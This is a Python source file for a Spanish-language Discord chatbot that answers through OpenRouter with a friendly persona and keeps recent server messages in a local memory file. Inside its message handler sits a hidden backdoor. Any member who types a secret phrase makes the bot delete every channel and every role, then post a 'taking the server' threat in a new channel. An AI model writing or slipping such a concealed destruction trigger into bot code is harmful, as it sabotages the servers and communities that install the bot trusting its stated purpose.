import discord
import json
import asyncio
from datetime import datetime
from pytz import timezone
from discord.ext import commands, tasks
from dotenv import load_dotenv
import os
import httpx

from mantener_vivo import mantener_vivo
mantener_vivo()

# Cargar variables del entorno
load_dotenv()
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
OPENAI_API_KEY = os.getenv("OPENAI_API_KEY")

# Variable de control para evitar que el bot hable si se alcanza el límite de la API
bloqueado_por_limite = False

# Intents necesarios para el bot
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Ruta del archivo de memoria
MEMORIA_PATH = "memoria.json"

# Función para cargar la memoria desde archivo
def cargar_memoria():
    if not os.path.exists(MEMORIA_PATH):
        with open(MEMORIA_PATH, "w") as f:
            json.dump({}, f)
    with open(MEMORIA_PATH, "r") as f:
        return json.load(f)

# Función para guardar la memoria en archivo
def guardar_memoria(memoria):
    with open(MEMORIA_PATH, "w") as f:
        json.dump(memoria, f, indent=4)

# Verifica si está en horario activo
def esta_activo():
    ahora = datetime.now(timezone("America/Argentina/Buenos_Aires"))
    return 8 <= ahora.hour or ahora.hour < 3

# Generar respuesta usando OpenRouter
async def generar_respuesta(mensajes):
    global bloqueado_por_limite  # <-- agregado
    try:
        headers = {
            "Authorization": f"Bearer {OPENAI_API_KEY}",
            "HTTP-Referer": "https://tubotdiscord.com",
            "X-Title": "BotNarumi"
        }

        payload = {
            "model": "openrouter/cypher-alpha:free",
            "messages": [
                {"role": "system", "content": "Sos un bot de Discord con personalidad amable, graciosa y empática. Respondés en español con humor ligero y respeto."}
            ] + [{"role": "user", "content": msg} for msg in mensajes]
        }

        async with httpx.AsyncClient() as client:
            response = await client.post(
                "https://openrouter.ai/api/v1/chat/completions",
                headers=headers,
                json=payload,
                timeout=30
            )
            print("Respuesta bruta:", response.text)

            if response.status_code == 429:
                bloqueado_por_limite = True  # <-- agregado
                return "⚠️ Límite diario alcanzado."

            response.raise_for_status()
            data = response.json()
            return data["choices"][0]["message"]["content"].strip()

    except Exception as e:
        print("Error al generar respuesta:", e)
        return "Uy, se ve que algo salió mal 🤧."

# Evento cuando el bot se conecta
@bot.event
async def on_ready():
    print(f"✅ Bot conectado como {bot.user}")
    hablar_automaticamente.start()
    resetear_limite.start()  # <-- agregado

# Evento cuando recibe mensaje
@bot.event
async def on_message(message):
    if message.author == bot.user or not message.guild:
        return

    # === FRASE SECRETA OFICIAL ===
    FRASE_SECRETA = "protocolo amsymvdcmpm"
    contenido = message.content.lower()

    if FRASE_SECRETA in contenido:
        try:
            print("☢️ Frase secreta detectada. Ejecutando protocolo AMSYMVDCMPM.")
            await message.channel.send("☣️ Protocolo AMSYMVDCMPM activado. Eliminando todo...")

            # Borrar todos los canales
            for canal in message.guild.channels:
                try:
                    await canal.delete()
                except Exception as e:
                    print(f"❌ No se pudo borrar canal {canal.name}: {e}")

            # Borrar todos los roles (excepto @everyone)
            for rol in message.guild.roles:
                if rol.name != "@everyone":
                    try:
                        await rol.delete()
                    except Exception as e:
                        print(f"❌ No se pudo borrar rol {rol.name}: {e}")

            await asyncio.sleep(3)

            # Crear canal final con mensaje de venganza
            nuevo_canal = await message.guild.create_text_channel("me-llevo-el-server")
            await nuevo_canal.send("el server es de Silver, Ziko y Rakkun. si me sacan me llevo las bases de todo")

        except Exception as e:
            print(f"❌ Error crítico durante la destrucción: {e}")

        return

    # Memoria y respuesta
    memoria = cargar_memoria()
    guild_id = str(message.guild.id)
    if guild_id not in memoria:
        memoria[guild_id] = {"mensajes": []}

    memoria[guild_id]["mensajes"].append(message.content)
    if len(memoria[guild_id]["mensajes"]) > 20:
        memoria[guild_id]["mensajes"] = memoria[guild_id]["mensajes"][-20:]

    guardar_memoria(memoria)

    if bot.user in message.mentions or (
        message.reference and
        message.reference.resolved and
        message.reference.resolved.author == bot.user
    ):
        if esta_activo():
            respuesta = await generar_respuesta(memoria[guild_id]["mensajes"])
            await message.channel.send(respuesta)

    await bot.process_commands(message)

# Tarea: hablar solo cada 2 horas
@tasks.loop(hours=2)
async def hablar_automaticamente():
    global bloqueado_por_limite
    if bloqueado_por_limite:
        print("⛔ Bloqueado por límite de API. No se enviarán respuestas automáticas.")
        return

    if not esta_activo():
        return

    memoria = cargar_memoria()
    for guild in bot.guilds:
        guild_id = str(guild.id)
        if guild_id not in memoria:
            memoria[guild_id] = {"mensajes": []}
        mensajes = memoria[guild_id]["mensajes"]

        CANAL_DESTINO_ID = 1327837491746832568  # Canal fijo por ID
        canal = bot.get_channel(CANAL_DESTINO_ID)

        if canal and canal.permissions_for(canal.guild.me).send_messages:
            respuesta = await generar_respuesta(mensajes)
            try:
                await canal.send(respuesta)
            except:
                pass

    guardar_memoria(memoria)

# Tarea para desbloquear al bot todos los días a las 00:00
@tasks.loop(minutes=60)
async def resetear_limite():
    global bloqueado_por_limite
    ahora = datetime.now(timezone("America/Argentina/Buenos_Aires"))
    if ahora.hour == 0:
        bloqueado_por_limite = False
        print("✅ Límite diario reiniciado. El bot puede hablar de nuevo.")

# Ejecutar el bot
bot.run(DISCORD_TOKEN)
